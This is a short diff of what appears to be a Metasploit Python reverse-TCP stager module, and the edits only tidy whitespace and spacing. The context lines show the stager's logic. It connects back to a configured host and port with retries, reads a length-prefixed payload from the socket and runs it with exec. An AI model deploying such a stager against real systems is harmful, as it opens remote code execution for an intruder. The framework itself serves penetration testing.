@@ -20,7 +20,7 @@ module Payload::Python::ReverseTcp
     super
     register_advanced_options([
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
-        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts',5])
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5])
       ], self.class)
   end
 
@@ -57,8 +57,8 @@ module Payload::Python::ReverseTcp
       cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
       cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     else
-      if opts[:retry_count]>0
-        cmd << "for x in range(#{opts[:retry_count].to_i}):\n" 
+      if opts[:retry_count] > 0
+        cmd << "for x in range(#{opts[:retry_count].to_i}):\n"
       else
         cmd << "while 1:\n"
       end
@@ -79,7 +79,7 @@ module Payload::Python::ReverseTcp
     cmd << "while len(d)<l:\n"
     cmd << "\td+=s.recv(l-len(d))\n"
     cmd << "exec(d,{'s':s})\n"
-            
+
     py_create_exec_stub(cmd)
   end
 
